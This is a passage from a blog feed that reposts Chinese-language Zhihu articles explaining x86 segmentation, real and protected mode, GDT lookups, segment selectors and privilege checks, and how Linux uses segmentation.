data-original="https://pic4.zhimg.com/v2-aa74314824e11c7456e94577991b9f67_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-aa74314824e11c7456e94577991b9f67_b.jpg" data-original-token="v2-3a1882143e6067ffcbe4a3c051da49e2" height="263" data-lazy-status="ok"></div></figure><p data-pid="8in-MOnU">如果使用paging，并采用segmented memory model，则每个segment被进一步被划分成多个pages。采用flat memory model的话就更不用说了，基本等同于内存就是由pages组成的。Segmentation中的descriptor有各种权限检测位，paging中的descriptor也有各种权限检测位，两者一致还好办，如果不一致呢？</p><p data-pid="oUN16yJf">比如对于某个segment，其descriptor限定为该segment是只读的，但是这个segment里某个page的descriptor又将该page设为可写的。如果出现这种情况，则后一级page table descriptor里的设置，会覆盖掉前一级segment descriptor里对应的设置。规则变得复杂起来，这就是保持兼容性的代价。</p><p data-pid="Im7gky3W"><b>64位长模式下的segmentation</b></p><p data-pid="KQCJPtx7">所谓64位长模式，是指运行在64位的x86_64处理器上，且操作系统和应用程序都是64位的。在64位模式中，DS, ES, SS已经不再使用。对于FS和GS，也不会再进行segment descriptor中的limit检测和attribute检测，而只是进行一下地址的<a href="https://zhuanlan.zhihu.com/p/66794639" class="internal" data-za-detail-view-id="1043">canonical检测</a>。可以看出，在x86_64中，segmentation的使用已经被越来越弱化了。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-0340ef0f721118a7079feb31fbd0c1f3_b.jpg" data-caption="" data-size="normal" data-rawwidth="405" data-rawheight="388" class="content_image" width="405"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-0340ef0f721118a7079feb31fbd0c1f3_720w.webp" data-caption="" data-size="normal" data-rawwidth="405" data-rawheight="388" class="content_image lazy" width="405" data-actualsrc="https://pic4.zhimg.com/v2-0340ef0f721118a7079feb31fbd0c1f3_b.jpg" data-original-token="v2-abe251462c98b0229f7e383b47e21c50" height="388" data-lazy-status="ok"></div></figure><p data-pid="mehKtKR0"><b>从实模式到保护模式</b></p><p data-pid="0Y1ynfej">MS-DOS系统是使用实模式的，但现在MS-DOS已经不怎么被使用了，Linux和Windows等现代操作系统都是运行在保护模式，那现在实模式还有用么，为什么现在最新的x64处理器依然支持实模式？</p><p data-pid="yLeh9I3A">因为BIOS之类的引导程序还需要用到它。保护模式依赖于GDT/LDT和page table，而它们的建立和初始化，只可能在实模式下进行。就像一个可执行文件的代码不可能全部用C语言实现，因为C语言要用到函数，而函数的执行需要堆栈，堆栈的初始化只能用汇编语言实现。</p><p data-pid="AQThhu7a">x86上电后即进入实模式，置位CR0寄存器的PE位可进入保护模式（其实还需要其他一系列操作）。虽然通过将PE位置0可以退回实模式，但是额外需要非常多繁琐的操作。</p><p data-pid="_9LzKa-l">如果你仅仅是出于某种原因不想要这套保护机制，那你可以首先关掉CR0中的WP（Write Protect）全局写保护，然后把所有的页表描述符中的U/S位置为user，R/W置为writable，那不就是表面上有保护，实际上等于没有了么，因为保护的就是只读的部分不要被错误写，属于supervisor的部分不要被user错误访问，全都是user+writable还有啥可保护的。是不是很tricky的操作……</p><p data-pid="xNliWSbu"><b>segmentation和paging的区别</b></p><p data-pid="jhhmI_Do">其实保护模式下的segmentation和paging机制真的是很相似的，一个是查GDT表，一个是查页表，但它们也存在一些区别：</p><ol><li data-pid="Nja36iId">page是固定大小的（比如4KB），且大小由处理器架构决定，而segment的大小是不固定的，且大小由软件确定。因为segment的长度不定，在分配内存时，可能会发生内存中的空闲区域小于要加载的segment，导致分配失败，而粒度更小的page可以更好的利用这些空闲区域。</li></ol><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-1425ea63c8af5872d6b35ba0f894cb31_b.jpg" data-caption="" data-size="normal" data-rawwidth="884" data-rawheight="261" class="origin_image zh-lightbox-thumb" width="884" data-original="https://pic2.zhimg.com/v2-1425ea63c8af5872d6b35ba0f894cb31_r.jpg"/></noscript><div><img src="https://pic2.zhimg.com/80/v2-1425ea63c8af5872d6b35ba0f894cb31_720w.webp" data-caption="" data-size="normal" data-rawwidth="884" data-rawheight="261" class="origin_image zh-lightbox-thumb lazy" width="884" data-original="https://pic2.zhimg.com/v2-1425ea63c8af5872d6b35ba0f894cb31_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-1425ea63c8af5872d6b35ba0f894cb31_b.jpg" data-original-token="v2-60ba1a7d04aba0a367708fbefd799f31" height="261" data-lazy-status="ok"></div></figure><p data-pid="nwr7gIFp">2. 在多进程的环境中，每个用户进程在运行的时候都希望有一个简单的执行环境，一个单一的地址空间（关于地址空间请参考<a href="https://zhuanlan.zhihu.com/p/66794639" class="internal" data-za-detail-view-id="1043">这篇文章</a>），好像自己占有整个计算机一样，而不用介入复杂的内存管理过程。</p><p data-pid="E-Lf9rZf">segmentation和paging都能解决地址空间隔离的问题，但segmentation不能解决内存使用效率的问题。segmentation对内存区域的映射是以segment为单位的，如果内存不足，被换出到磁盘的是整个segment，这势必会造成大量的磁盘访问操作，严重影响系统速度。</p><p data-pid="1nJ9Qgd0">因此，segmentation还是因为粒度偏大而显得粗糙，而paging在换入和换出内存的时候是以page为单位，并由此衍生出了demand paging的<a href="https://zhuanlan.zhihu.com/p/68071761" class="internal" data-za-detail-view-id="1043">page cache</a>，demand allocation的<a href="https://zhuanlan.zhihu.com/p/70964551" class="internal" data-za-detail-view-id="1043">anonymous pages</a>，<a href="https://zhuanlan.zhihu.com/p/70964195" class="internal" data-za-detail-view-id="1043">page relcaim</a>等众多机制，提高了内存的使用效率。</p><p data-pid="K95tbB1V"><b>番外 - Linux系统中的segmentation</b></p><p data-pid="AwK4lofC">Linux虽然支持segmentation，但对这一硬件特性的使用非常有限，一是因为segmentation和paging本来就是冗余的，二是因为linux作为一个通用的操作系统，需要兼容不同的硬件平台，而RISC架构一般是没有segmentation机制的，所以2.6版本的linux仅在针对x86平台的部分涉及到了segmentation。</p><p data-pid="qlc97tjG">Linux中对GDT的实现是，每个核有一个GDT，每个GDT包含18个segment descriptors，其中4个为user code, user data, kernel code, kernel data。它们的base都是0，所以其实也是flat memory model。区别仅在于user对应的两个segments的DPL是3，kernel对应的两个segments的DPL是0。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-d5985b6601fe338391ed102abf6070a4_b.png" data-caption="" data-size="normal" data-rawwidth="1156" data-rawheight="161" class="origin_image zh-lightbox-thumb" width="1156" data-original="https://pic1.zhimg.com/v2-d5985b6601fe338391ed102abf6070a4_r.jpg"/></noscript><div><img src="https://pic1.zhimg.com/80/v2-d5985b6601fe338391ed102abf6070a4_720w.webp" data-caption="" data-size="normal" data-rawwidth="1156" data-rawheight="161" class="origin_image zh-lightbox-thumb lazy" width="1156" data-original="https://pic1.zhimg.com/v2-d5985b6601fe338391ed102abf6070a4_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-d5985b6601fe338391ed102abf6070a4_b.png" data-original-token="v2-d5985b6601fe338391ed102abf6070a4" height="161" data-lazy-status="ok"></div></figure><p class="ztext-empty-paragraph"><br></p><p data-pid="KUsTF7TA"><b>参考：</b></p><p data-pid="spMmhhTE">《程序员的自我修养——链接、装载和库》</p><p class="ztext-empty-paragraph"><br></p><p data-pid="DdkK3Vqr"><i>原创文章，转载请注明出处。</i></p><p><br> </p><p></p></div></div></div></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/67576012">文章转载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>内存管理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>segmentation和保护模式（二）</title>
    <link href="/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>分段模式和保护模式（二）</p><span id="more"></span><div class="Post-RichTextContainer"><div class="css-1yuhvjn"><div class="css-376mun"><div class="RichText ztext Post-RichText css-1em8ozd" options="[object Object]"><p data-first-child="" data-pid="8F8nqcAz"><a href="https://zhuanlan.zhihu.com/p/67735248" class="internal" data-za-detail-view-id="1043">segmentation和保护模式（一）</a></p><p data-pid="Jp2JhZLd">上文讲到了segment descriptor，把这些descriptors放在一起（在内存里连续分布），就构成了<b>GDT</b>（Global Descriptor Table），所以GDT也可以被称为段（描述符）表。</p><p data-pid="xfXwIgSi">页表的首地址是存储在CR3寄存器中的，类似的，GDT的首地址存在GDTR寄存器中。页表的查找是通过使用虚拟地址作为index，而GDT的查找使用的是segment selector。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-fcb7cb22635b1dd56f332b83b8339edf_b.jpg" data-caption="" data-size="normal" data-rawwidth="599" data-rawheight="338" class="origin_image zh-lightbox-thumb" width="599" data-original="https://pic4.zhimg.com/v2-fcb7cb22635b1dd56f332b83b8339edf_r.jpg"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-fcb7cb22635b1dd56f332b83b8339edf_720w.webp" data-caption="" data-size="normal" data-rawwidth="599" data-rawheight="338" class="origin_image zh-lightbox-thumb lazy" width="599" data-original="https://pic4.zhimg.com/v2-fcb7cb22635b1dd56f332b83b8339edf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-fcb7cb22635b1dd56f332b83b8339edf_b.jpg" data-original-token="v2-3eea09135a42fe680b29d72c642b74e5" height="338" data-lazy-status="ok"></div></figure><p data-pid="vdrLInK5">要找到某个page中的一个byte，得先通过虚拟地址的前面20位（以32位系统2级页表，4KB的page为例），查找页表得到物理页面号，再通过虚拟地址的后12位作为偏移（offset），在物理页面中找到对应的byte。</p><p data-pid="ly-x7q1d">类似的，要找到某个segment的一个byte，得先通过segment selector，查找GDT得到segment的基址（base），再通过一个offset，在该segment中找到对应的byte。那segment selector又是从哪些获取的呢？</p><p data-pid="_hCXxg2w">x86中有6个专门的寄存器CS, DS, ES, FS, GS, SS来存放这些selectors（拿专门的寄存器来放selector，主要是为了加快获取selector的速度），CS里存放的selector是指向GDT中code段的描述符，SS里存放的selector是指向GDT中stack段的描述符，DS里存放的selector是指向GDT中data段的描述符。</p><p data-pid="3pMO2ixt">ES（Extra）, FS, GS（FS和GS是80386引入的，是ES的克隆产品）既可以指向code，也可以指向data，但实际应用中大多是指向data，等同于DS（从属性上来说，heap, bss都算是data段，所以可能data需要的段比较多吧）。</p><p data-pid="HCHR1JZO">一个segment seletor的构成如下（16个bit）：</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-3bc5c396e5d128386d402ec38ca0a05b_b.jpg" data-caption="" data-size="normal" data-rawwidth="405" data-rawheight="182" class="content_image" width="405"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-3bc5c396e5d128386d402ec38ca0a05b_720w.webp" data-caption="" data-size="normal" data-rawwidth="405" data-rawheight="182" class="content_image lazy" width="405" data-actualsrc="https://pic4.zhimg.com/v2-3bc5c396e5d128386d402ec38ca0a05b_b.jpg" data-original-token="v2-bc51c267a671d325472fa6fbbd230cec" height="182" data-lazy-status="ok"></div></figure><p data-pid="Wwu5fbm3"><b>index</b>就是在GDT中查找的索引，占13位，因此GDT最大可以有 <span class="ztext-math" data-eeimg="1" data-tex="2^{13}=8192 "><span></span><span><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax_SVG" id="MathJax-Element-2-Frame" tabindex="0" style="font-size: 100%; display: inline-block; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msup><mn>2</mn><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mn>13</mn></mrow></msup><mo>=</mo><mn>8192</mn></math>" role="presentation"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="10.787ex" height="2.442ex" viewBox="0 -949.6 4644.4 1051.3" role="img" focusable="false" aria-hidden="true" style="vertical-align: -0.236ex;"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><use xlink:href="#MJMAIN-32" x="0" y="0"></use><g transform="translate(500,393)"><use transform="scale(0.707)" xlink:href="#MJMAIN-31"></use><use transform="scale(0.707)" xlink:href="#MJMAIN-33" x="500" y="0"></use></g><use xlink:href="#MJMAIN-3D" x="1586" y="0"></use><g transform="translate(2642,0)"><use xlink:href="#MJMAIN-38"></use><use xlink:href="#MJMAIN-31" x="500" y="0"></use><use xlink:href="#MJMAIN-39" x="1001" y="0"></use><use xlink:href="#MJMAIN-32" x="1501" y="0"></use></g></g></svg><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mn>2</mn><mrow class="MJX-TeXAtom-ORD"><mn>13</mn></mrow></msup><mo>=</mo><mn>8192</mn></math></span></span><script type="math/tex;mode=inline" id="MathJax-Element-2">2^{13}=8192 </script><span class="tex2jax_ignore math-holder">2^{13}=8192 </span></span></span>个entries。</p><p data-pid="auOEyzZL"><b>TI</b>表示要查的表是GDT还是LDT（Local Descriptor Table）。GDT是所有task共享的，是必须要有的，而LDT是task单独拥有的，是可选的，有点类似于linux中进程的page table是单独拥有的，而kernel的page table是所有进程共享的，但在segmentation的实际应用中，LDT较少被使用。</p><p data-pid="lhfgYCZI">说到<b>RPL</b> (Requested Privilege Level)，还得提到另一个概念，叫CPL (Current Privilege Level) 。CPL是放在CS和SS中的，它只会在当前运行的特权级别更改的时候（比如从用户空间trap到内核空间）被更改，而RPL是软件设置的。</p><p data-pid="3Pl-uJAk">如果要访问的数据也在当前segment，就不需要切换segment，这时的jmp跳转被称作near jump（直接给出offst即可），与之相对的是要重新查找GDT，切换segment的far jmp（需要给出segment和offset）。</p><div class="highlight"><pre><code class="language-c">    <span class="n">jmp</span> <span class="n">eax</span>      <span class="p">;</span> <span class="n">Near</span> <span class="n">jump</span>    <span class="n">jmp</span> <span class="mh">0x10</span><span class="o">:</span><span class="n">eax</span> <span class="p">;</span> <span class="n">Far</span> <span class="n">jump</span></code></pre></div><p data-pid="jCWSgTN6">对于CS，只有RPL和CPL的值都小于上文介绍到的segment descriptor里的DPL，也就是特权级别高于要访问的segment要求的级别才可以。在切换segment的时候，需要将新的segment selector放入segment register，此时CPU会进行根据公式 <span class="ztext-math" data-eeimg="1" data-tex="MAX(CPL, RPL)<= DPL"><span></span><span><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax_SVG" id="MathJax-Element-1-Frame" tabindex="0" style="font-size: 100%; display: inline-block; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>M</mi><mi>A</mi><mi>X</mi><mo stretchy=&quot;false&quot;>(</mo><mi>C</mi><mi>P</mi><mi>L</mi><mo>,</mo><mi>R</mi><mi>P</mi><mi>L</mi><mo stretchy=&quot;false&quot;>)</mo><mo>&amp;lt;=</mo><mi>D</mi><mi>P</mi><mi>L</mi></math>" role="presentation"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="29.355ex" height="2.789ex" viewBox="0 -849.8 12638.7 1200.9" role="img" focusable="false" aria-hidden="true" style="vertical-align: -0.815ex;"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><use xlink:href="#MJMATHI-4D" x="0" y="0"></use><use xlink:href="#MJMATHI-41" x="1051" y="0"></use><use xlink:href="#MJMATHI-58" x="1802" y="0"></use><use xlink:href="#MJMAIN-28" x="2654" y="0"></use><use xlink:href="#MJMATHI-43" x="3044" y="0"></use><use xlink:href="#MJMATHI-50" x="3804" y="0"></use><use xlink:href="#MJMATHI-4C" x="4556" y="0"></use><use xlink:href="#MJMAIN-2C" x="5237" y="0"></use><use xlink:href="#MJMATHI-52" x="5682" y="0"></use><use xlink:href="#MJMATHI-50" x="6442" y="0"></use><use xlink:href="#MJMATHI-4C" x="7193" y="0"></use><use xlink:href="#MJMAIN-29" x="7875" y="0"></use><g transform="translate(8542,0)"><use xlink:href="#MJMAIN-3C"></use><use xlink:href="#MJMAIN-3D" x="778" y="0"></use></g><use xlink:href="#MJMATHI-44" x="10377" y="0"></use><use xlink:href="#MJMATHI-50" x="11205" y="0"></use><use xlink:href="#MJMATHI-4C" x="11957" y="0"></use></g></svg><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>M</mi><mi>A</mi><mi>X</mi><mo stretchy="false">(</mo><mi>C</mi><mi>P</mi><mi>L</mi><mo>,</mo><mi>R</mi><mi>P</mi><mi>L</mi><mo stretchy="false">)</mo><mo>&lt;=</mo><mi>D</mi><mi>P</mi><mi>L</mi></math></span></span><script type="math/tex;mode=inline" id="MathJax-Element-1">MAX(CPL, RPL)<= DPL</script><span class="tex2jax_ignore math-holder">MAX(CPL, RPL)&lt;= DPL</span></span></span> 来进行这一检查，</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-de90e030ae3b71aa159d612053a52e42_b.jpg" data-caption="" data-size="normal" data-rawwidth="493" data-rawheight="304" class="origin_image zh-lightbox-thumb" width="493" data-original="https://pic3.zhimg.com/v2-de90e030ae3b71aa159d612053a52e42_r.jpg"/></noscript><div><img src="https://pic3.zhimg.com/80/v2-de90e030ae3b71aa159d612053a52e42_720w.webp" data-caption="" data-size="normal" data-rawwidth="493" data-rawheight="304" class="origin_image zh-lightbox-thumb lazy" width="493" data-original="https://pic3.zhimg.com/v2-de90e030ae3b71aa159d612053a52e42_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-de90e030ae3b71aa159d612053a52e42_b.jpg" data-original-token="v2-e2df83028c844cda274b4f0f79f0a648" height="304" data-lazy-status="ok"></div></figure><p data-pid="5cl4CiPB">出于一些特殊用途的考虑，RPL的值可以设置的比DPL低，但是在访问 segment的时候是无效的，还得听CPL的。只有RPL的值大于DPL，也就是主动降低级别时（也是出于其他用途，在此不展开），RPL才有效。下图中，实线部分的访问（A和B访问E）是被允许的，而虚线部分的访问（C和D访问E）是被禁止的。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-86e1de0c0b37a1425d8d453c13a1e8af_b.jpg" data-caption="" data-size="normal" data-rawwidth="608" data-rawheight="431" class="origin_image zh-lightbox-thumb" width="608" data-original="https://pic4.zhimg.com/v2-86e1de0c0b37a1425d8d453c13a1e8af_r.jpg"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-86e1de0c0b37a1425d8d453c13a1e8af_720w.webp" data-caption="" data-size="normal" data-rawwidth="608" data-rawheight="431" class="origin_image zh-lightbox-thumb lazy" width="608" data-original="https://pic4.zhimg.com/v2-86e1de0c0b37a1425d8d453c13a1e8af_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-86e1de0c0b37a1425d8d453c13a1e8af_b.jpg" data-original-token="v2-bf1542d1163a454b44715d70b412e0bb" height="431" data-lazy-status="ok"></div></figure><p data-pid="VF05PfLy">对于SS, RPL, DPL, CPL的值必须完全一样。</p><p data-pid="-Ptbecy7">介绍完这些bit field的含义，来看一段实际的设置代码：</p><div class="highlight"><pre><code class="language-c"><span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x10</span><span class="n">mov</span> <span class="n">ds</span><span class="p">,</span> <span class="n">ax</span></code></pre></div><p data-pid="GTZ-dgZt">x86里不能把立即数直接往DS里送，得通过AX中转一下（好在AX这个中间商没有赚差价）。代码执行完后DS寄存器中的值应该为0x10，表达为二进制的对应关系如下：</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-a8d350d54d6e17a1ae757745d845799e_b.png" data-caption="" data-size="normal" data-rawwidth="349" data-rawheight="57" class="content_image" width="349"/></noscript><div><img src="https://pic3.zhimg.com/80/v2-a8d350d54d6e17a1ae757745d845799e_720w.webp" data-caption="" data-size="normal" data-rawwidth="349" data-rawheight="57" class="content_image lazy" width="349" data-actualsrc="https://pic3.zhimg.com/v2-a8d350d54d6e17a1ae757745d845799e_b.png" data-original-token="v2-a8d350d54d6e17a1ae757745d845799e" height="57" data-lazy-status="ok"></div></figure><p data-pid="A908xXwb">则DS中的selector指向的是GDT中的第三个entry（index从0开始算）。</p><p data-pid="mnE4Ucnu">同样的segement:offset的logical address格式，这时表达的linear address就不再是"segment&lt;&lt;4 + offset"，而是"segment base (found from GDT[segment selector]) + offset"了。</p><p data-pid="5c2aw8pD">80286中的segment register不再直接指向segment，而是要经过一个GDT查表的过程，而GDT表中的的segment descriptor有limit和各种权限检测位，起到了对地址访问的保护作用，所以这种内存访问被称作保护模式（protected mode）。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-7a8c61a37a16abd57d3506911d886d30_b.jpg" data-caption="" data-size="normal" data-rawwidth="632" data-rawheight="596" class="origin_image zh-lightbox-thumb" width="632" data-original="https://pic1.zhimg.com/v2-7a8c61a37a16abd57d3506911d886d30_r.jpg"/></noscript><div><img src="https://pic1.zhimg.com/80/v2-7a8c61a37a16abd57d3506911d886d30_720w.webp" data-caption="" data-size="normal" data-rawwidth="632" data-rawheight="596" class="origin_image zh-lightbox-thumb lazy" width="632" data-original="https://pic1.zhimg.com/v2-7a8c61a37a16abd57d3506911d886d30_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-7a8c61a37a16abd57d3506911d886d30_b.jpg" data-original-token="v2-687960813e0d0fff5aa5b40da8bb2cb0" height="596" data-lazy-status="ok"></div></figure><p data-pid="gkUyihHu">所有task共用GDT，岂不是task A也可以访问到task B的segment了？理论上是可以的，但是每个task用的segment descriptor，都是操作系统来建立的，建立好之后某个task只能访问为它分配的那几个segments。所以，保护模式下的segmentation机制既提供了不同属性的segment之间的隔离，也提供了多任务环境下不同task之间的隔离。</p><p data-pid="NA-ggbaW"><b>番外 - segmentation中的TLB </b></p><p data-pid="D5jwXoQ0">Paging机制里有为了加快查找速度，缓存页表项的TLB，同样，在segmentation里也有类似的硬件单元。每当一个segment seletor被载入segment register中， 表明该segment当前正在被访问，则将该segment seletor指向的segment descriptor存入专门的nonprogrammable register中（可理解位描述符缓存）。</p><p data-pid="8ie0VzZ9">一个segment register对应一个nonprogrammable register，所以只要segment register中的内容没有发生变化，CPU就不需要去查找GDT，直接从nonprogrammable register获取segment的地址。</p><p data-pid="nqu9Qy2a">segmentation的机制介绍完了，那它和paging机制是怎么共存和交互的呢？请看<a href="https://zhuanlan.zhihu.com/p/67576012" class="internal" data-za-detail-view-id="1043">下文</a>分解。</p><p class="ztext-empty-paragraph"><br></p><p data-pid="2ilWvwSV"><i>原创文章，转载请注明出处。</i></p></div></div></div></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/67714693">文章转载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>内存管理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>segmentation和保护模式（一）</title>
    <link href="/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>分段机制和保护模式之间的关系</p><span id="more"></span><div class="Post-RichTextContainer"><div class="css-1yuhvjn"><div class="css-376mun"><div class="RichText ztext Post-RichText css-1em8ozd" options="[object Object]"><p data-first-child="" data-pid="PvbhMse_">前面的几篇文章讲到了<a href="https://zhuanlan.zhihu.com/p/64978946" class="internal" data-za-detail-view-id="1043">页表</a>，以及构成页表的<a href="https://zhuanlan.zhihu.com/p/67053210" class="internal" data-za-detail-view-id="1043">页表描述符</a>，分页机制（paging）是80386引入的，而在其之前的8086和80286，使用的是分段机制（segmentation）。一些新的处理器架构，比如ARM，从诞生之日，就只支持分页机制。虽然分段机制看起来似乎是一个上古时代的，已经被淘汰的东西，但毕竟人家是分页机制的前辈。</p><p data-pid="tDivDX6U">以兼容性著称的x86处理器，即便到了今天的64位时代，依然保留了对segmentation的向前兼容，而linux操作系统最开始也是基于i386写的，所以也保留了对segmentation的支持。了解下历史，往往可以让我们对后来出现的某些事物有更好的理解。</p><p data-pid="fqn2Dbcs">提到segment，做嵌入式软件的同学可能会想到elf（executable and linkable file）文件，一个elf文件包含了text段，data段，bss段。Linux操作系统在加载elf文件运行进程后，还会生成stack段，heap段，每个segment用一个vm_area_struct结构体管理。</p><p data-pid="NNb5-doO">x86中segment划分也是类似的，包括cs（code segment）,ds（data segment）,ss（stack segment）等。同elf和linux中软件实现的segment有所不同，x86中的segmentation机制含有更多硬件的参与，比如硬件实现的对权限位的检测（类似于MMU对页表描述符中权限位的检测）。此外，x86中还有一些特殊的system segment，比如存储task相关信息，以提供对context switch的硬件支持的task state segment。</p><p data-pid="0hJ2Cmdo">让我们从1978年的8086开始，看看x86中的segmentation机制到底是怎样一回事。</p><p data-pid="FwgQaktG"><b>8086实模式时代</b></p><p data-pid="H7ZkXtM_">8086的CPU是16位的，但intel的工程师希望在不改变CPU寄存器和指令集的基础上，让它可以可以寻址更大的内存范围。于是他们使用了一种叫segmentation的机制，即一个逻辑地址（logical address）由segment加上offset组成，一般表达为<b>segement:offset</b>的形式。</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-92232dbf9b80c2b9e95810018bdbd482_b.jpg" data-caption="" data-size="normal" data-rawwidth="568" data-rawheight="144" class="origin_image zh-lightbox-thumb" width="568" data-original="https://pic3.zhimg.com/v2-92232dbf9b80c2b9e95810018bdbd482_r.jpg"/></noscript><div><img src="https://pic3.zhimg.com/80/v2-92232dbf9b80c2b9e95810018bdbd482_720w.webp" data-caption="" data-size="normal" data-rawwidth="568" data-rawheight="144" class="origin_image zh-lightbox-thumb lazy" width="568" data-original="https://pic3.zhimg.com/v2-92232dbf9b80c2b9e95810018bdbd482_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-92232dbf9b80c2b9e95810018bdbd482_b.jpg" data-original-token="v2-a21ada2821783a8b4957e63f1a18f15f" height="144" data-lazy-status="ok"></div></figure><p data-pid="f3Wz0Mwa">当segment的值放入segment register时，就是告诉CPU：现在要访问这个segment对应的内存区域，然后再根据offset的值，在这个segment内找到对应的字节。转换后形成的地址被称作线性地址（linear address），若offset为16位，linear address = segment&lt;&lt;4 + offset，则寻址范围就扩大成了20位，比如logical address为0xA000:0x5F00，转换成linear address就是0xA5F00。</p><p data-pid="kdB9yevE">这种内存访问被称为实模式（Real Mode），因为linear address是由segment基址移位加上一个偏移得到，因此实模式下的这种segmentation被称为<b>shift-and-add</b> segmentation。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-c71ecb1206f45d90d3c6367b1644247c_b.jpg" data-caption="" data-size="small" data-rawwidth="301" data-rawheight="271" class="content_image" width="301"/></noscript><div><img src="https://pic1.zhimg.com/80/v2-c71ecb1206f45d90d3c6367b1644247c_720w.webp" data-caption="" data-size="small" data-rawwidth="301" data-rawheight="271" class="content_image lazy" width="301" data-actualsrc="https://pic1.zhimg.com/v2-c71ecb1206f45d90d3c6367b1644247c_b.jpg" data-original-token="v2-f1bc4ae2eed75d0d1912c75db816f710" height="271" data-lazy-status="ok"></div></figure><p data-pid="hUMxVRXT">在实模式下segment register直接指向segment：</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-c1d7f5b64042384804be4a509e93474a_b.jpg" data-caption="" data-size="normal" data-rawwidth="688" data-rawheight="412" class="origin_image zh-lightbox-thumb" width="688" data-original="https://pic3.zhimg.com/v2-c1d7f5b64042384804be4a509e93474a_r.jpg"/></noscript><div><img src="https://pic3.zhimg.com/80/v2-c1d7f5b64042384804be4a509e93474a_720w.webp" data-caption="" data-size="normal" data-rawwidth="688" data-rawheight="412" class="origin_image zh-lightbox-thumb lazy" width="688" data-original="https://pic3.zhimg.com/v2-c1d7f5b64042384804be4a509e93474a_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-c1d7f5b64042384804be4a509e93474a_b.jpg" data-original-token="v2-a33900019deb8d0e403a204667777854" height="412" data-lazy-status="ok"></div></figure><p data-pid="fXNXoltq"><b>80286保护模式时代</b></p><p data-pid="_-UDvn2f">80286也使用segmentation，但和8086不同的是，80286中segment register存的不再是segment的起始地址，而是一个segment selector，通过这个selector查找GDT表获得segment descriptor，segment descriptor存的才是segment的起始地址，因此保护模式下的这种segmentation被称为<b>table-based</b> segmentation（区别于实模式的shift-and-add方式）。</p><p data-pid="wY_DxO39">名词轰炸有没有？别慌，我们先从段描述符（segment descriptor）入手，看看它的组成是怎样的。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-9df1db9256e405b3eb252471760fe53f_b.jpg" data-caption="" data-size="normal" data-rawwidth="915" data-rawheight="287" class="origin_image zh-lightbox-thumb" width="915" data-original="https://pic4.zhimg.com/v2-9df1db9256e405b3eb252471760fe53f_r.jpg"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-9df1db9256e405b3eb252471760fe53f_720w.webp" data-caption="" data-size="normal" data-rawwidth="915" data-rawheight="287" class="origin_image zh-lightbox-thumb lazy" width="915" data-original="https://pic4.zhimg.com/v2-9df1db9256e405b3eb252471760fe53f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-9df1db9256e405b3eb252471760fe53f_b.jpg" data-original-token="v2-81649d1448669e3740b7686810993215" height="287" data-lazy-status="ok"></div></figure><p 